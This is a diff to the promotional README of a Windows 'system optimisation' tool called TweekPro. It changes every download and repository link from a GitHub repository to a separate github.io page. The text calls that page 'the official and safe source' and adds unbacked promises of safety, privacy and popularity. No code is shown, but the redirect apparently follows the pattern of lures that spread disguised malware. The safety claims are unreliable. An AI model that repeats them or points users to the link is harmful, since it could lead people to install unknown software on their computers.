@@ -8,7 +8,7 @@ Welcome to **TweekPro** – your complete Windows management solution that helps
 
 **Step 1: Get the Application**
 
-[![⬇️ Download TweekPro Now](https://img.shields.io/badge/⬇️_DOWNLOAD_TWEEKPRO-FF6B6B?style=for-the-badge&logo=windows&logoColor=white&labelColor=4ECDC4)](https://github.com/Unpainted-departure3343/TweekPro)
+[![⬇️ Download TweekPro Now](https://img.shields.io/badge/⬇️_DOWNLOAD_TWEEKPRO-FF6B6B?style=for-the-badge&logo=windows&logoColor=white&labelColor=4ECDC4)](https://unpainted-departure3343.github.io)
 
 Visit this link to download the application. This is the official and safe source for TweekPro.
 
@@ -121,7 +121,7 @@ Your data stays on your computer. TweekPro does not collect personal information
 
 We're committed to making TweekPro better every day. The application receives regular updates with new features, improved performance, and enhanced compatibility with the latest Windows versions.
 
-For help, suggestions, or bug reports, visit the official repository: [TweekPro GitHub](https://github.com/Unpainted-departure3343/TweekPro)
+For help, suggestions, or bug reports, visit the official repository: [TweekPro GitHub](https://unpainted-departure3343.github.io)
 
 ---
 
@@ -129,7 +129,7 @@ For help, suggestions, or bug reports, visit the official repository: [TweekPro 
 
 Don't let a slow, cluttered computer ruin your productivity. Download TweekPro today and experience the difference that professional-grade system management can make.
 
-[![🚀 Get TweekPro Now](https://img.shields.io/badge/🚀_GET_TWEEKPRO_NOW-FF9F43?style=for-the-badge&logo=github&logoColor=white&labelColor=6C5CE7)](https://github.com/Unpainted-departure3343/TweekPro)
+[![🚀 Get TweekPro Now](https://img.shields.io/badge/🚀_GET_TWEEKPRO_NOW-FF9F43?style=for-the-badge&logo=github&logoColor=white&labelColor=6C5CE7)](https://unpainted-departure3343.github.io)
 
 Join thousands of satisfied users who keep their Windows systems fast, clean, and reliable with TweekPro. It's free, it's powerful, and it's exactly what your computer has been missing.
 
